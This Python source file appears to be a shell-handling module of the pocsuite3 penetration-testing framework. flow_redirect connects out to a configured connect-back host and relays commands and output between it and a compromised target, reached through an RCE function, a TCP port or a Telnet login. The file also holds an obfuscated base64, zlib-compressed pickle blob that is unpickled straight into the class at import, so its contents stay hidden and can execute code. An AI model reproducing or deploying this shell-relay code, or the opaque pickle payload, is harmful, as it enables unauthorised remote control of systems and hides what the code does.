import os
import socket
import zlib
import pickle
import base64
import select
import telnetlib
import threading
from pocsuite3.lib.core.poc import POCBase
from pocsuite3.lib.utils import random_str
from pocsuite3.lib.core.common import check_port
from pocsuite3.lib.core.data import conf, logger


def read_inputs(s):
    buffer = []
    try:
        while True:
            chunk = s.recv(1)
            if not chunk or chunk == b'\n':
                break
            buffer.append(chunk)
    except Exception:
        pass
    return b''.join(buffer)


def read_results(conn, inputs):
    if isinstance(conn, telnetlib.Telnet):
        flag = random_str(6).encode()
        inputs = inputs.strip() + b';' + flag + b'\n'
        results = b''
        conn.write(inputs)
        count = 10
        while count:
            count -= 1
            chunk = conn.read_until(random_str(6).encode(), 0.2)
            if len(chunk) > 0:
                results += chunk
            if results.count(flag) >= 2:
                # remove the Telnet input echo
                results = results.split(inputs.strip())[-1]
                results = os.linesep.encode().join(
                    results.split(flag)[0].splitlines()[0:-1])
                return results.strip() + b'\n'
    elif callable(conn):
        results = conn(inputs.decode())
        if not isinstance(results, bytes):
            results = results.encode()
        if results.strip() == b'':
            results = b'COMMAND NO OUTPUT\n'
        return results
    elif isinstance(conn, socket.socket):
        flag = random_str(6).encode()
        inputs = inputs.strip() + b';' + flag + b'\n'
        conn.send(inputs)
        count = 10
        results = b''
        while count:
            count -= 1
            ready = select.select([conn], [], [], 0.2)
            if ready[0]:
                chunk = conn.recv(1024)
                results += chunk
            if results.count(flag) >= 2:
                break
        results = results.split(inputs.strip())[-1]
        results = os.linesep.encode().join(
            results.split(flag)[0].splitlines()[0:-1])
        return results.strip() + b'\n'
    return b'\n'


def flow_redirect(conn):
    s = socket.socket()
    s.connect((conf.connect_back_host, conf.connect_back_port))
    while True:
        inputs = read_inputs(s)
        results = read_results(conn, inputs)
        s.send(results)


def start_listener(conn):
    t = threading.Thread(target=flow_redirect,
                         name="bind-listener-thread",
                         args=[conn])
    t.setDaemon(True)
    t.start()


def bind_shell(obj, rce_func='_rce', check=True):
    if not (isinstance(obj, POCBase) and hasattr(obj, rce_func)
            and callable(getattr(obj, rce_func))):
        return False
    conn = getattr(obj, rce_func)
    if check:
        flag = random_str(6).encode()
        if flag not in read_results(conn, b'echo %s' % flag):
            return False
    start_listener(conn)


def bind_tcp_shell(host, port, check=True):
    if not check_port(host, port):
        return False
    try:
        s = socket.socket()
        s.connect((host, port))
        if check:
            flag = random_str(6).encode()
            if flag not in read_results(s, b'echo %s' % flag):
                return False
        start_listener(s)
    except Exception as e:
        logger.error(str(e))


def bind_telnet_shell(host, port, user, pwd, check=True):
    if not check_port(host, port):
        return False
    try:
        tn = telnetlib.Telnet(host, port)
        tn.expect([b'Login: ', b'login: '], 10)
        tn.write(user.encode() + b'\n')
        tn.expect([b'Password: ', b'password: '], 10)
        tn.write(pwd.encode() + b'\n')
        tn.write(b'\n')
        if check:
            flag = random_str(6).encode()
            if flag not in read_results(tn, b'echo %s' % flag):
                return False
        start_listener(tn)
    except Exception as e:
        logger.error(str(e))


class BIND_PAYLOAD:
    payload = (
        b'eJy1GE1v28g1200/4EOBntrexqxjky1NyW52E4eWW0WWd7VrS4KkNAmygUFRI4sx'
        b'NWQ5QzuOLKCXXgpdCqj/oP+wQM99b2YoUzLtJC3KIDLnfX/Ne8P5y8N//PxXD+Qz'
        b'nZuzh83WYX0++yeLBpRsU7LFRxV/FISD0ziJfMq5w2PvkplGqR+wEh8ZlsuocPyE'
        b'eoJ2aXJBE3OYMl8EETP9MKBMWJOJenHiIKYmHzlcDAJmueotSjVCU2swTZJl8HRq'
        b'OWHABQXlk/LUsLbmsx81a/PZL5lPtkOyHRMAo83atPnsx91Wrdqbz5o88j1BerX2'
        b'9nGj26s3nwGlndCUU28wSOxhlJyT+qt67ZlmtWNxZSsjbE4FDwY2D84CJmzuMTqf'
        b'ffldtz1/9bNfPHiw/+iPJPbOqPypMz8Cz84qRiqG208N8uhgbUEQjOMoERXjnXfh'
        b'OUHk/DZD38aGHjtzEjoMqS+cWsS4SFJfRMkncpxQMYoG92jHjHUj/5yKe4hSEYRO'
        b'1/cYo5ni9TUCT5z2w8AnXHgC/nRFAh6ThELmOYWVqSFgtEUmkgOfhIo0YYTRS83y'
        b'PIWqgmpBOkezm5YjIoU2LVfyTtdA9dr+t72TYzBBBCKkB9+lXJCjKCFHKdsvKdja'
        b'/vPW4Wv4c9TqnJCTeu/b1mHFaLe6PYM0qyf1igFZHhukWus1Ws2K8RvjQMrfbzTb'
        b'L3qk97oNJIK+Fxm5Px4PPkYzhl1ikAsvTGnF8MS5QUbBYEBZARtP++MAGP9UPX4B'
        b'y6PwCoTvl9BaDK1k8EOPcwwP9caQdkYx6QT0UTbgpDcC+CAX0gaLU6GoCb9wF/BW'
        b'Km4QInbXFpgV0eayBHuVM58/fMQogP1/QSpL6hYYEQMG9WXQ6Y1mXTQXUTAgScrM'
        b'VdHP0+GQJnTQARdpQj54IIqlYegWUr1MAgFUo3dJIZlIrlbE46NkQv0t6zIRlAuE'
        b'hmpfLcu9JUirzUlS9khJ+RBqsA5OkSh/5CWkL6W8eauFIuzN05293be36aEFkZCy'
        b'MzG6jbuENk2JaSo8CPvgOVgxppJvk7KtVTmKxLLIASmvZiLnpXOJDuT5NeNt5RnH'
        b'MEz5yCwgmC5BpgQasj8iZv29T2McFoSuGjL9hJwGQ2JCXtdVFViFZkEY/DDC5lIQ'
        b'T+DHdN4rAP0qlPB5XkzXbn51j4xwxxjfRII0I0YNN48bQja7NPYSD5tARYMd2Wxa'
        b'QzMbI0dA5vCMrga1o418HkUh9RgJ+MuAKRB6uyTWoX9OvZCbxg8/GFbecsmEuzlJ'
        b'qe7DhIacFpAMQUBGk7cfeyOgE1BBuXDOqGiD0jHFHaEap3VjlSTWSSCbm5J5YRw2'
        b'1iXrtAZ/PLhTgezeVq711WRvhQ774QMwyZUDE6EJDGZueBkUujRLO84Z80IHYvzO'
        b'yO/b3DAmAwrSYPPnYRWlAY05vI3O108BN6RRVH08ZAX9kJoY+xxDq/8OmjaJQEcR'
        b'L3SOBqw85i+VqToLED6KLouMU+ilAPj0PaTG1kF+89aRUyknMkNg/PkNGNMoa2J1'
        b'ByCZbm0Z6+RmIZtm/0pQgO7t2WSnLH+g1zz+Gl924Ge3LN+mYFUx4+MnNvn6CeJB'
        b'2TQ3gFaL9vPsQbF7T1H3V/CzgzY9wRdclR/fYw4Q7O0VmLOazIBdROe4SzA/jlqZ'
        b'kU1MhbekrfkqbqtDONGHceA0NcjSwnJ5Umc3wv3MWwUws5M81EFu7pmW5cCB+JCG'
        b'wViOLWgKVSOXd9msuO+MPN6EMwmM8D/gkqn3Z4C/oQX4UsecftpO5yNKw8K9Pooi'
        b'OPPdtdslNm8rzsk4gsMssDSYoGcw9KDncQoLs1iGJF/a7LdHjjamO6Jh2PZWh/Cd'
        b'O0CyZjxLpfdZ1b86fApq+9M0fayuVxStLS1zjXQHNNzTSgU996OuA6fX241USrq/'
        b'me5kDWvnrnaKLkn14JMej7JZ2Zh/9brqTJGe+/uuDKn8WCJc/YFNpwBWsbh8K5aV'
        b'aatazG/klUj+DyPpEyL5GWPpjhh9PET/3XjC5/8wovC5r1Xe1W6XZsJiH63WkKnJ'
        b'lj6l7mqqtq4aROS/DaDdWg4EJBGr8SgUfyNkRXpO78fFf+zAmh1R8Wu/3anrz9hH'
        b'Fez9CCtJ4H5Jf2qX1Fd54/DZ2nz2k/Zr+OZuzmf/iq8gY4xs+2RL3SjoENgRt+Ez'
        b'WFvs8op2Sv3JXKwenTaa9Z6tl91W7fvTbq9Tr55YLnf6ARuYplF25D/DnpSnFsL1'
        b'zdBXluvbXoU7no8Ogu8RdwZpvGv6Dp58WQQxKxdCdwqhu5YbV26MdnwvDM03i9sv'
        b'29gOjLd4FfWwXe8cz2f/jmkSyoszmKW6b7gbcQXsdLWfXbutXcz5ZkP+QIeI+lcM'
        b'978h/Bi3ufS3K4OBV1WnATM3Yps0mtXDw85ptfkaaLTvXZB3Un1VazWblgt9xES9'
        b'Og41uwuRwYlMatZkEsVI3ztsNG3jYLMGkzODtF70VkH1TicDwb7z9dVf3+MjAs7j'
        b'xZwL/n/Z/rY9f7X+xYMH8Sgm2wnZ2sgSfKpuB81qgdvd1vFpr9a2dHBOpb8b3F7O'
        b'cIbVngIesrXhh5kC7eUG9AD5FWzugJPB0FzXePUdCwy2sUEMSKpF3weQl4BlEuSH'
        b'MhLA8EXR40EllgEwgAjSnBiZ6PUhjYYmUligZGNcGULqfAVwb+nbGNvQA0M0emxh'
        b'rKZTLJbOi+ev57O/JWn/CmKl5wpWDdqFBwm8koQdAqFRl6rYQPW9p7bDX1T5AgJG'
        b'+9gIIAyNlqPsB6C0fjK5DqJr34kTPBvBhyN6PJ1SNnDhPyawWdudz46SMSmJcVwa'
        b'uuPzYTCMshVeoKrXa138kH2ye7C5cy3vXy/U9euBogFx1Zffz2d/9y7Pydbz+jeN'
        b'5mTCK0YpYFSUoLZLQFwql8qGO4hkqkx+vQmmh0BAfGu/Urb6YOG5CygfjFcemv6C'
        b'yDooW8qXjfL1JlfFDaQYYaLjsV4xMJ6GpZDcksH/aa9+DGV4OJ/9WtAQ7Bng9fHC'
        b'KemHDMfv57NzCMd2MiwMyfX1+JzB4FIrErtm/iL6WoUFX63y/nLkdJBk9NxFwOez'
        b'Lzrz2V87WAcG399WVaFHAF6ny8tZvLnuh4DCe+Ze50Xd5rJA1DumvLKV/G4rqwmE'
        b'YviwII8hbNzEvKs3eb1+s8RNZVk2RsmYp85/AMfBUyk='
    )
    vars().update(pickle.loads(zlib.decompress(base64.b64decode(payload))))
    del payload
